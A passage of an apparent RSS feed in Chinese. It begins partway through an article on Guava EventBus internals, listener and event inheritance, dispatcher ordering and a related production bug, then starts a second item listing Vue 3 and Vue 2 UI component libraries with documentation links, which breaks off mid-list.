&lt;p&gt;因此，如果存在listenerSon、listenerFather两个listener，且listenerSon继承listenerFather。当都使用@PostConstrucrt注册时，会导致listenerFather里面的订阅方法注册两次。&lt;/p&gt;

&lt;h2&gt;4.3、含有继承关系的listener&lt;/h2&gt;

&lt;p&gt;当注册listener含有继承关系时，listener处理Event消息时，listener的父类也会处理该消息。&lt;/p&gt;

&lt;h3&gt;4.3.1、继承关系的订阅者&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;https://s3.cn-north-1.jdcloud-oss.com/shendengbucket1/2023-02-03-16-14F089qFJtgwn8Xud.png&quot; alt=&quot;image.png&quot;/&gt;&lt;/p&gt;

&lt;h3&gt;4.3.2、原理&lt;/h3&gt;

&lt;p&gt;子类listener注册，父类listener也会注册&lt;br/&gt;
&lt;img src=&quot;https://s3.cn-north-1.jdcloud-oss.com/shendengbucket1/2023-02-03-15-5050vdLEu23zk8GfrZ.png&quot; alt=&quot;image.png&quot;/&gt;&lt;/p&gt;

&lt;h2&gt;4.4、含有继承关系的Event&lt;/h2&gt;

&lt;p&gt;如果作为参数的Event有继承关系，使用EventBus发布Event时，Event父类的监听者也会对Event进行处理。&lt;/p&gt;

&lt;h3&gt;4.4.1、执行结果&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;https://s3.cn-north-1.jdcloud-oss.com/shendengbucket1/2023-02-03-15-51WxPqOJjtAW93Nxz.png&quot; alt=&quot;image.png&quot;/&gt;&lt;br/&gt;
&lt;img src=&quot;https://s3.cn-north-1.jdcloud-oss.com/shendengbucket1/2023-02-03-15-51W7dZaJqQSckySbQ.png&quot; alt=&quot;image.png&quot;/&gt;&lt;/p&gt;

&lt;h3&gt;4.4.2、原理&lt;/h3&gt;

&lt;p&gt;在分发消息的时候，会获取所有订阅者数据（Event订阅者和Event超类的订阅者），然后进行分发数据。&lt;br/&gt;
获取订阅者数据如下图：&lt;br/&gt;
&lt;img src=&quot;https://s3.cn-north-1.jdcloud-oss.com/shendengbucket1/2023-02-03-15-52iFTw6TT52nU9w52og.png&quot; alt=&quot;image.png&quot;/&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://s3.cn-north-1.jdcloud-oss.com/shendengbucket1/2023-02-03-15-5252c6jhLokxQybOMG.png&quot; alt=&quot;image.png&quot;/&gt;&lt;/p&gt;

&lt;p&gt;缓存Event及其超类的类对象，key为Event类对象。&lt;br/&gt;
&lt;img src=&quot;https://s3.cn-north-1.jdcloud-oss.com/shendengbucket1/2023-02-03-15-520xLNddrPzK3hnKd.png&quot; alt=&quot;image.png&quot;/&gt;&lt;/p&gt;

&lt;h1&gt;5、分享提问问题&lt;/h1&gt;

&lt;h4&gt;问题1：PerThreadQueuedDispatcherd 里面的队列，是否是有界队列？&lt;/h4&gt;

&lt;p&gt;有界队列，最大值为 int 的最大值 （2147483647），源码如下图：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://s3.cn-north-1.jdcloud-oss.com/shendengbucket1/2023-02-03-15-528QBIATdvsKU8cfm.png&quot; alt=&quot;image.png&quot;/&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://s3.cn-north-1.jdcloud-oss.com/shendengbucket1/2023-02-03-15-52RnFOuRGdDIzkizF.png&quot; alt=&quot;image.png&quot;/&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://s3.cn-north-1.jdcloud-oss.com/shendengbucket1/2023-02-03-15-52IQqykEEJO7AoDK57.png&quot; alt=&quot;image.png&quot;/&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://s3.cn-north-1.jdcloud-oss.com/shendengbucket1/2023-02-03-15-53QeG3LYWhrKdGo2b.png&quot; alt=&quot;image.png&quot;/&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://s3.cn-north-1.jdcloud-oss.com/shendengbucket1/2023-02-03-15-53MhCR2MFFuTtTBxU.png&quot; alt=&quot;image.png&quot;/&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://s3.cn-north-1.jdcloud-oss.com/shendengbucket1/2023-02-03-15-53JTkKEqwnalveOjz.png&quot; alt=&quot;image.png&quot;/&gt;&lt;/p&gt;

&lt;h4&gt;问题2：dispatcher 分发给订阅者是否有序？&lt;/h4&gt;

&lt;p&gt;&lt;strong&gt;EventBus:同步事件总线&lt;/strong&gt;：&lt;br/&gt;
同一个事件的多个订阅者，在接收到事件的顺序上面有不同。谁先注册到EventBus的，谁先执行（由于base使用的是PostConstruct进行注册，因此跟不同Bean之间的初始化顺序有关系）。如果是在同一个类中的两个订阅者一起被注册到EventBus的情况，收到事件的顺序跟方法名有关。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;AsyncEventBus:异步事件总线&lt;/strong&gt;：同一个事件的多个订阅者，它们的注册顺序跟接收到事件的顺序上没有任何联系，都会同时收到事件，并且都是在新的线程中，异步并发的执行自己的任务。&lt;/p&gt;

&lt;h4&gt;问题3：EventBus与SpringEvent的对比？&lt;/h4&gt;



&lt;table&gt;&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;项目&lt;/th&gt;
&lt;th&gt;事件&lt;/th&gt;
&lt;th&gt;发布者&lt;/th&gt;
&lt;th&gt;发布方法&lt;/th&gt;
&lt;th&gt;是否异步&lt;/th&gt;
&lt;th&gt;监听者&lt;/th&gt;
&lt;th&gt;注册方式&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;EventBus&lt;/td&gt;
&lt;td&gt;任意对象&lt;/td&gt;
&lt;td&gt;EventBus&lt;/td&gt;
&lt;td&gt;EventBus#post&lt;/td&gt;
&lt;td&gt;支持同步异步&lt;/td&gt;
&lt;td&gt;注解Subscribe方法&lt;/td&gt;
&lt;td&gt;手动注册EventBus#register&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;SpringEvent&lt;/td&gt;
&lt;td&gt;任意对象&lt;/td&gt;
&lt;td&gt;ApplicationEventPublisher&lt;/td&gt;
&lt;td&gt;ApplicationEventPublisher#publishEvent&lt;/td&gt;
&lt;td&gt;支持同步异步&lt;/td&gt;
&lt;td&gt;注解EventListener方法&lt;/td&gt;
&lt;td&gt;系统注册&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;



&lt;table&gt;&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;项目&lt;/th&gt;
&lt;th&gt;事件区分&lt;/th&gt;
&lt;th&gt;是否支持事件簇&lt;/th&gt;
&lt;th&gt;是否支持自定义event&lt;/th&gt;
&lt;th&gt;是否支持过滤&lt;/th&gt;
&lt;th&gt;是否支持事件隔离&lt;/th&gt;
&lt;th&gt;是否支持事务&lt;/th&gt;
&lt;th&gt;是否支持设置订阅者消费顺序&lt;/th&gt;
&lt;th&gt;复杂程度&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;EventBus&lt;/td&gt;
&lt;td&gt;Class&lt;/td&gt;
&lt;td&gt;是&lt;/td&gt;
&lt;td&gt;是&lt;/td&gt;
&lt;td&gt;否&lt;/td&gt;
&lt;td&gt;是&lt;/td&gt;
&lt;td&gt;否&lt;/td&gt;
&lt;td&gt;否&lt;/td&gt;
&lt;td&gt;简单&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Spring Event&lt;/td&gt;
&lt;td&gt;Class&lt;/td&gt;
&lt;td&gt;是&lt;/td&gt;
&lt;td&gt;是&lt;/td&gt;
&lt;td&gt;是&lt;/td&gt;
&lt;td&gt;否&lt;/td&gt;
&lt;td&gt;是&lt;/td&gt;
&lt;td&gt;是&lt;/td&gt;
&lt;td&gt;复杂&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;

&lt;p&gt;参考链接&lt;a href=&quot;https://www.cnblogs.com/shoren/p/eventBus_springEvent.html&quot;&gt;https://www.cnblogs.com/shoren/p/eventBus_springEvent.html&lt;/a&gt;&lt;/p&gt;

&lt;h4&gt;问题4：EventBus的使用场景，结合现有使用场景考虑是否合适？&lt;/h4&gt;

&lt;p&gt;EventBus暂时不适用，主要有一下几个点:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;EventBus不支持事务，项目在更新、创建商品时，最好等事务提交成功后，再发送MQ消息（主要问题点）&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;EventBus不支持设置同一消息的订阅者消费顺序。&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;EventBus不支持消息过滤。SpringEvent支持消息过滤&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h1&gt;6.项目中遇到的问题&lt;/h1&gt;

&lt;h2&gt;6.1、问题描述&lt;/h2&gt;

&lt;p&gt;商品上架时会触发渠道分发功能，会有两步操作&lt;/p&gt;



&lt;p&gt;所以分发会触发两条分发状态不同的商品变更消息，&lt;strong&gt;一条是未分发，另一条是已分发&lt;/strong&gt;。实际发送了两条分发状态相同的商品变更消息，&lt;strong&gt;状态都是已分发&lt;/strong&gt;。&lt;/p&gt;

&lt;h2&gt;6.2、原因&lt;/h2&gt;

&lt;p&gt;我们先来回顾下EventBus 监听者处理事件时有三种策略，这是根本原因：&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;ImmediateDispatcher：来一个事件马上进行处理。&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;PerThreadQueuedDispatcher（eventBus默认选项，项目中使用此策略）&lt;/strong&gt;：在同一个线程post的Event,执行的顺序是有序的。用ThreadLocal&lt;queue&gt; queue来实现每个线程post的Event是有序的，在把事件添加到queue后会有一个ThreadLocal dispatching来判断当前线程是否正在分发，如果正在分发，则这次添加的event不会马上进行分发而是等到dispatching的值为false才进行。&lt;/queue&gt;&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;LegacyAsyncDispatcher（AsyncEventBus默认选项）：会有一个全局的队列ConcurrentLinkedQueue queue保存EventWithSubscriber(事件和subscriber),如果被不同的线程poll 不能保证在queue队列中的event是有序发布的。&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;详情可见上文中的【2.3.4、事件分发】&lt;/p&gt;

&lt;p&gt;再看下项目中的逻辑：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;商品自动分发在商品变更的Listener里操作。

由于当前分发操作处于商品上架事件处理过程中，因此对于添加分发记录事件不会立马处理，而是将其放入队列。

上架操作完成，分发状态变为已分发。

等上架操作完成后，商品变更Listener处理分发事件(此时有两条EventMsg，一个是添加分发记录另一个是修改分发状态)，分发状态实时查询，对于第一个分发事件，查询到的分发记录是已分发状态。

最终导致两条消息都是已分发状态。


&lt;/code&gt;&lt;/pre&gt;

&lt;h2&gt;6.3、场景复现&lt;/h2&gt;

&lt;p&gt;在handler中对静态变量进行两次+1 操作，每操作一步发送一条事件，此处假设静态变量为分发状态。&lt;br/&gt;
&lt;img src=&quot;https://s3.cn-north-1.jdcloud-oss.com/shendengbucket1/2023-02-03-15-540RxH6GrJonnQumZ.png&quot; alt=&quot;image.png&quot;/&gt;&lt;br/&gt;
&lt;img src=&quot;https://s3.cn-north-1.jdcloud-oss.com/shendengbucket1/2023-02-03-15-540y52wuOzKzDrnHD0.png&quot; alt=&quot;image.png&quot;/&gt;&lt;/p&gt;

&lt;h2&gt;6.4、解决办法&lt;/h2&gt;

&lt;p&gt;目前 Dispatcher 包用default 修饰，使用者无法指定Dispatcher 策略。并且 ImmediateDispatcher 使用private修饰。&lt;br/&gt;
&lt;img src=&quot;https://s3.cn-north-1.jdcloud-oss.com/shendengbucket1/2023-02-03-15-55bN2K2k29TXyBO6qi.png&quot; alt=&quot;image.png&quot;/&gt;&lt;br/&gt;
&lt;img src=&quot;https://s3.cn-north-1.jdcloud-oss.com/shendengbucket1/2023-02-03-15-553Neic8TdTNhiaYV.png&quot; alt=&quot;image.png&quot;/&gt;&lt;br/&gt;
&lt;img src=&quot;https://s3.cn-north-1.jdcloud-oss.com/shendengbucket1/2023-02-03-15-55RSoMbmTslSC87bm.png&quot; alt=&quot;image.png&quot;/&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;因此目前暂无解决非同步问题，只能在业务逻辑上进行规避。&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;其实可以修改源码并发布一个包自己使用，但是公司安全规定不允许这样做，只能通过业务逻辑上进行规避，下图是github上对此问题的讨论。&lt;br/&gt;
&lt;img src=&quot;https://s3.cn-north-1.jdcloud-oss.com/shendengbucket1/2023-02-03-15-55n3PfPRrhHoYg8Xj.png&quot; alt=&quot;image.png&quot;/&gt;&lt;/p&gt;

&lt;h1&gt;7、总结&lt;/h1&gt;

&lt;p&gt;如果项目中需要使用异步解耦处理一些事项，使用EventBus还是比较方便的。&lt;/p&gt;
&lt;/div&gt;
  &lt;/div&gt;&lt;/div&gt;</content:encoded>
</item>
<item>
<guid>3338297c8fa61e2634f4fd594067fd89</guid>
<title>前端 UI 组件库有哪些选择</title>
<link>https://toutiao.io/k/4ehnmbv</link>
<content:encoded>&lt;div&gt;&lt;div&gt;&lt;div class=&quot;lake-content&quot;&gt;
&lt;h2 id=&quot;gPWZj&quot;&gt;&lt;a name=&quot;toc-1&quot;/&gt;&lt;span class=&quot;ne-text&quot;&gt;Vue 3&lt;/span&gt;&lt;/h2&gt;
&lt;h3 id=&quot;IMkab&quot;&gt;&lt;a name=&quot;toc-2&quot;/&gt;&lt;span class=&quot;ne-text&quot;&gt;Element Plus&lt;/span&gt;&lt;/h3&gt;
&lt;p id=&quot;u3c7c3090&quot; class=&quot;ne-p&quot;&gt;&lt;span class=&quot;ne-text&quot;&gt;基于 Vue 3，面向设计师和开发者的组件库 。&lt;/span&gt;&lt;/p&gt;
&lt;p id=&quot;u5e46d077&quot; class=&quot;ne-p&quot;&gt;&lt;strong&gt;&lt;span class=&quot;ne-text&quot;&gt;创作者：&lt;/span&gt;&lt;/strong&gt;&lt;span class=&quot;ne-text&quot;&gt;饿了么团队&lt;/span&gt;&lt;/p&gt;
&lt;p id=&quot;u8d069150&quot; class=&quot;ne-p&quot;&gt;&lt;strong&gt;&lt;span class=&quot;ne-text&quot;&gt;文档地址：&lt;/span&gt;&lt;/strong&gt;&lt;a class=&quot;ne-link&quot; href=&quot;https://element-plus.gitee.io/zh-CN/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot; data-href=&quot;https://element-plus.gitee.io/zh-CN/&quot;&gt;&lt;span class=&quot;ne-text&quot;&gt;https://element-plus.gitee.io/zh-CN/&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;TryxR&quot;&gt;&lt;a name=&quot;toc-3&quot;/&gt;&lt;span class=&quot;ne-text&quot;&gt;Ant Design Vue&lt;/span&gt;&lt;/h3&gt;
&lt;p id=&quot;u79558178&quot; class=&quot;ne-p&quot;&gt;&lt;span class=&quot;ne-text&quot;&gt;ant-design-vue 为 Web 应用提供了丰富的基础 UI 组件，我们还将持续探索企业级应用的最佳 UI 实践。&lt;/span&gt;&lt;/p&gt;
&lt;p id=&quot;u41371dfc&quot; class=&quot;ne-p&quot;&gt;&lt;strong&gt;&lt;span class=&quot;ne-text&quot;&gt;创作者：&lt;/span&gt;&lt;/strong&gt;&lt;span class=&quot;ne-text&quot;&gt;开源社区&lt;/span&gt;&lt;/p&gt;
&lt;p id=&quot;uda566a9a&quot; class=&quot;ne-p&quot;&gt;&lt;strong&gt;&lt;span class=&quot;ne-text&quot;&gt;文档地址：&lt;/span&gt;&lt;/strong&gt;&lt;a class=&quot;ne-link&quot; href=&quot;https://antdv.com/components/overview-cn&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot; data-href=&quot;https://antdv.com/components/overview-cn&quot;&gt;&lt;span class=&quot;ne-text&quot;&gt;https://antdv.com/components/overview-cn&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;s6VHe&quot;&gt;&lt;a name=&quot;toc-4&quot;/&gt;&lt;span class=&quot;ne-text&quot;&gt;Vant 4&lt;/span&gt;&lt;/h3&gt;
&lt;p id=&quot;u537e83b9&quot; class=&quot;ne-p&quot;&gt;&lt;span class=&quot;ne-text&quot;&gt;轻量、可靠的移动端 Vue 组件库。&lt;/span&gt;&lt;/p&gt;
&lt;p id=&quot;uf05c57ed&quot; class=&quot;ne-p&quot;&gt;&lt;strong&gt;&lt;span class=&quot;ne-text&quot;&gt;创作者：&lt;/span&gt;&lt;/strong&gt;&lt;span class=&quot;ne-text&quot;&gt;有赞团队&lt;/span&gt;&lt;/p&gt;
&lt;p id=&quot;ufbd2c52e&quot; class=&quot;ne-p&quot;&gt;&lt;strong&gt;&lt;span class=&quot;ne-text&quot;&gt;文档地址：&lt;/span&gt;&lt;/strong&gt;&lt;a class=&quot;ne-link&quot; href=&quot;https://vant-contrib.gitee.io/vant/#/zh-CN&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot; data-href=&quot;https://vant-contrib.gitee.io/vant/#/zh-CN&quot;&gt;&lt;span class=&quot;ne-text&quot;&gt;https://vant-contrib.gitee.io/vant/#/zh-CN&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;hxtO6&quot;&gt;&lt;a name=&quot;toc-5&quot;/&gt;&lt;span class=&quot;ne-text&quot;&gt;VARLET&lt;/span&gt;&lt;/h3&gt;
&lt;p id=&quot;u57cfbf36&quot; class=&quot;ne-p&quot;&gt;&lt;span class=&quot;ne-text&quot;&gt;Varlet 是一个基于 Vue3 开发的 Material 风格移动端组件库，全面拥抱 Vue3 生态，由社区团队维护。支持 Typescript、按需引入、暗黑模式、主题定制、国际化，并提供 VSCode 插件保障良好的开发体验。&lt;/span&gt;&lt;/p&gt;
&lt;p id=&quot;ucb3bd697&quot; class=&quot;ne-p&quot;&gt;&lt;strong&gt;&lt;span class=&quot;ne-text&quot;&gt;创作者：&lt;/span&gt;&lt;/strong&gt;&lt;span class=&quot;ne-text&quot;&gt;开源社区&lt;/span&gt;&lt;/p&gt;
&lt;p id=&quot;u2f6cef96&quot; class=&quot;ne-p&quot;&gt;&lt;strong&gt;&lt;span class=&quot;ne-text&quot;&gt;文档地址：&lt;/span&gt;&lt;/strong&gt;&lt;a class=&quot;ne-link&quot; href=&quot;https://varlet.gitee.io/varlet-ui/#/zh-CN/index&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot; data-href=&quot;https://varlet.gitee.io/varlet-ui/#/zh-CN/index&quot;&gt;&lt;span class=&quot;ne-text&quot;&gt;https://varlet.gitee.io/varlet-ui/#/zh-CN/index&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;lu3d8&quot;&gt;&lt;a name=&quot;toc-6&quot;/&gt;&lt;span class=&quot;ne-text&quot;&gt;Naive UI&lt;/span&gt;&lt;/h3&gt;
&lt;p id=&quot;ud5ac6612&quot; class=&quot;ne-p&quot;&gt;&lt;span class=&quot;ne-text&quot;&gt;一个 Vue 3 组件库，比较完整，主题可调，使用 TypeScript，快，有点意思 。&lt;/span&gt;&lt;/p&gt;
&lt;p id=&quot;udb62ba7c&quot; class=&quot;ne-p&quot;&gt;&lt;strong&gt;&lt;span class=&quot;ne-text&quot;&gt;创作者：&lt;/span&gt;&lt;/strong&gt;&lt;span class=&quot;ne-text&quot;&gt; 开源社区&lt;/span&gt;&lt;/p&gt;
&lt;p id=&quot;ue81ad4a7&quot; class=&quot;ne-p&quot;&gt;&lt;strong&gt;&lt;span class=&quot;ne-text&quot;&gt;文档地址：&lt;/span&gt;&lt;/strong&gt;&lt;a class=&quot;ne-link&quot; href=&quot;https://www.naiveui.com/zh-CN/light&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot; data-href=&quot;https://www.naiveui.com/zh-CN/light&quot;&gt;&lt;span class=&quot;ne-text&quot;&gt;https://www.naiveui.com/zh-CN/light&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;HctsK&quot;&gt;&lt;a name=&quot;toc-7&quot;/&gt;&lt;span class=&quot;ne-text&quot;&gt;View UI Plus&lt;/span&gt;&lt;/h3&gt;
&lt;p id=&quot;uab443612&quot; class=&quot;ne-p&quot;&gt;&lt;span class=&quot;ne-text&quot;&gt;View UI Plus 是 View Design 设计体系中基于 Vue.js 3 的一套 UI 组件库，主要用于企业级中后台系统。&lt;/span&gt;&lt;/p&gt;
&lt;p id=&quot;uf9809793&quot; class=&quot;ne-p&quot;&gt;&lt;strong&gt;&lt;span class=&quot;ne-text&quot;&gt;创作者：&lt;/span&gt;&lt;/strong&gt;&lt;span class=&quot;ne-text&quot;&gt; 长沙开发者科技有限公司&lt;/span&gt;&lt;/p&gt;
&lt;p id=&quot;ue5452207&quot; class=&quot;ne-p&quot;&gt;&lt;strong&gt;&lt;span class=&quot;ne-text&quot;&gt;文档地址：&lt;/span&gt;&lt;/strong&gt;&lt;a class=&quot;ne-link&quot; href=&quot;https://www.iviewui.com/view-ui-plus/guide/introduce&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot; data-href=&quot;https://www.iviewui.com/view-ui-plus/guide/introduce&quot;&gt;&lt;span class=&quot;ne-text&quot;&gt;https://www.iviewui.com/view-ui-plus/guide/introduce&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;IKWQz&quot;&gt;&lt;a name=&quot;toc-8&quot;/&gt;&lt;span class=&quot;ne-text&quot;&gt;Vuetify&lt;/span&gt;&lt;/h3&gt;
&lt;p id=&quot;uc53864a7&quot; class=&quot;ne-p&quot;&gt;&lt;span class=&quot;ne-text&quot;&gt;Vuetify is a no design skills required UI Library with beautifully handcrafted Vue Components. &lt;/span&gt;&lt;/p&gt;
&lt;p id=&quot;u6863f2f2&quot; class=&quot;ne-p&quot;&gt;&lt;strong&gt;&lt;span class=&quot;ne-text&quot;&gt;创作者：&lt;/span&gt;&lt;/strong&gt;&lt;span class=&quot;ne-text&quot;&gt; 开源社区&lt;/span&gt;&lt;/p&gt;
&lt;p id=&quot;ud8b36e63&quot; class=&quot;ne-p&quot;&gt;&lt;strong&gt;&lt;span class=&quot;ne-text&quot;&gt;文档地址：&lt;/span&gt;&lt;/strong&gt;&lt;a class=&quot;ne-link&quot; href=&quot;https://next.vuetifyjs.com/en/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot; data-href=&quot;https://next.vuetifyjs.com/en/&quot;&gt;&lt;span class=&quot;ne-text&quot;&gt;https://next.vuetifyjs.com/en/&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;niFYW&quot;&gt;&lt;a name=&quot;toc-9&quot;/&gt;&lt;span class=&quot;ne-text&quot;&gt;Wave UI&lt;/span&gt;&lt;/h3&gt;
&lt;p id=&quot;u29da8825&quot; class=&quot;ne-p&quot;&gt;&lt;span class=&quot;ne-text&quot;&gt;A Vue.js UI framework with only the bright side. &lt;/span&gt;&lt;/p&gt;
&lt;p id=&quot;u51aa5748&quot; class=&quot;ne-p&quot;&gt;&lt;strong&gt;&lt;span class=&quot;ne-text&quot;&gt;创作者：&lt;/span&gt;&lt;/strong&gt;&lt;span class=&quot;ne-text&quot;&gt;开源社区&lt;/span&gt;&lt;/p&gt;
&lt;p id=&quot;uff993f06&quot; class=&quot;ne-p&quot;&gt;&lt;strong&gt;&lt;span class=&quot;ne-text&quot;&gt;文档地址：&lt;/span&gt;&lt;/strong&gt;&lt;a class=&quot;ne-link&quot; href=&quot;https://antoniandre.github.io/wave-ui/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot; data-href=&quot;https://antoniandre.github.io/wave-ui/&quot;&gt;&lt;span class=&quot;ne-text&quot;&gt;https://antoniandre.github.io/wave-ui/&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;QZ5ve&quot;&gt;&lt;a name=&quot;toc-10&quot;/&gt;&lt;span class=&quot;ne-text&quot;&gt;Vue 2&lt;/span&gt;&lt;/h2&gt;
&lt;h3 id=&quot;UvZSJ&quot;&gt;&lt;a name=&quot;toc-11&quot;/&gt;&lt;span class=&quot;ne-text&quot;&gt;Vant&lt;/span&gt;&lt;/h3&gt;
&lt;p id=&quot;ube417963&quot; class=&quot;ne-p&quot;&gt;&lt;span class=&quot;ne-text&quot;&gt;轻量、可靠的移动端 Vue 组件库。&lt;/span&gt;&lt;/p&gt;
&lt;p id=&quot;u7ef34685&quot; class=&quot;ne-p&quot;&gt;&lt;strong&gt;&lt;span class=&quot;ne-text&quot;&gt;创作者：&lt;/span&gt;&lt;/strong&gt;&lt;span class=&quot;ne-text&quot;&gt;有赞团队&lt;/span&gt;&lt;/p&gt;
&lt;p id=&quot;uc80078ff&quot; class=&quot;ne-p&quot;&gt;&lt;strong&gt;&lt;span class=&quot;ne-text&quot;&gt;文档地址：&lt;/span&gt;&lt;/strong&gt;&lt;a class=&quot;ne-link&quot; href=&quot;https://vant-contrib.gitee.io/vant/v2/#/zh-CN/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot; data-href=&quot;https://vant-contrib.gitee.io/vant/v2/#/zh-CN/&quot;&gt;&lt;span class=&quot;ne-text&quot;&gt;https://vant-contrib.gitee.io/vant/v2/#/zh-CN/&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;Qsupp&quot;&gt;&lt;a name=&quot;toc-12&quot;/&gt;&lt;span class=&quot;ne-text&quot;&gt;AT-UI&lt;/span&gt;&lt;/h3&gt;
&lt;p id=&quot;u7e9b64b4&quot; class=&quot;ne-p&quot;&gt;&lt;span class=&quot;ne-text&quot;&gt;AT-UI 是一款基于 Vue.js 2.0 的前端 UI 组件库，主要用于快速开发 PC 网站中后台产品。&lt;/span&gt;&lt;/p&gt;
&lt;p id=&quot;u49437dd4&quot; class=&quot;ne-p&quot;&gt;&lt;strong&gt;&lt;span class=&quot;ne-text&quot;&gt;创作者：&lt;/span&gt;&lt;/strong&gt;&lt;span class=&quot;ne-text&quot;&gt;凹凸实验室&lt;/span&gt;&lt;/p&gt;
&lt;p id=&quot;u4bf2b234&quot; class=&quot;ne-p&quot;&gt;&lt;strong&gt;&lt;span class=&quot;ne-text&quot;&gt;文档地址：&lt;/span&gt;&lt;/strong&gt;&lt;a class=&quot;ne-link&quot; href=&quot;https://at-ui.github.io/at-ui/#/zh&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot; data-href=&quot;https://at-ui.github.io/at-ui/#/zh&quot;&gt;&lt;span class=&quot;ne-text&quot;&gt;https://at-ui.github.io/at-ui/#/zh&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;FKjII&quot;&gt;&lt;a name=&quot;toc-13&quot;/&gt;&lt;span class=&quot;ne-text&quot;&gt;Vuetify&lt;/span&gt;&lt;/h3&gt;
&lt;p id=&quot;u3ad4a893&quot; class=&quot;ne-p&quot;&gt;&lt;span class=&quot;ne-text&quot;&gt;Vuetify is a no design skills required UI Framework with beautifully handcrafted Vue Components.&lt;/span&gt;&lt;/p&gt;
&lt;p id=&quot;u1b6efddc&quot; class=&quot;ne-p&quot;&gt;&lt;strong&gt;&lt;span class=&quot;ne-text&quot;&gt;创作者：&lt;/span&gt;&lt;/strong&gt;&lt;span class=&quot;ne-text&quot;&gt;开源社区&lt;/span&gt;&lt;/p&gt;
&lt;p id=&quot;u47057cb5&quot; class=&quot;ne-p&quot;&gt;&lt;strong&gt;&lt;span class=&quot;ne-text&quot;&gt;文档地址：&lt;/span&gt;&lt;/strong&gt;&lt;a class=&quot;ne-link&quot; href=&quot;https://vuetifyjs.com/en/getting-started/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot; data-href=&quot;https://vuetifyjs.com/en/getting-started/&quot;&gt;&lt;span class=&quot;ne-text&quot;&gt;https://vuetifyjs.com/en/getting-started/&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;njgUG&quot;&gt;&lt;a name=&quot;toc-14&quot;/&gt;&lt;span class=&quot;ne-text&quot;&gt;Element&lt;/span&gt;&lt;/h3&gt;
&lt;p id=&quot;u213fb718&quot; class=&quot;ne-p&quot;&gt;&lt;span class=&quot;ne-text&quot;&gt; Element，一套为开发者、设计师和产品经理准备的基于 Vue 2.0 的桌面端组件库。&lt;/span&gt;&lt;/p&gt;
&lt;p id=&quot;u0c3469b8&quot; class=&quot;ne-p&quot;&gt;&lt;strong&gt;&lt;span class=&quot;ne-text&quot;&gt;创作者：&lt;/span&gt;&lt;/strong&gt;&lt;span class=&quot;ne-text&quot;&gt;饿了么团队&lt;/span&gt;&lt;/p&gt;
&lt;p id=&quot;u7c1aec70&quot; class=&quot;ne-p&quot;&gt;&lt;strong&gt;&lt;span class=&quot;ne-text&quot;&gt;文档地址：&lt;/span&gt;&lt;/strong&gt;&lt;a class=&quot;ne-link&quot; href=&quot;https://element.eleme.cn/#/zh-CN&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot; data-href=&quot;https://element.eleme.cn/#/zh-CN&quot;&gt;&lt;span class=&quot;ne-text&quot;&gt;https://element.eleme.cn/#/zh-CN&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;SXgXe&quot;&gt;&lt;a name=&quot;toc-15&quot;/&gt;&lt;span class=&quot;ne-text&quot;&gt;Wave UI&lt;/span&gt;&lt;/h3&gt;
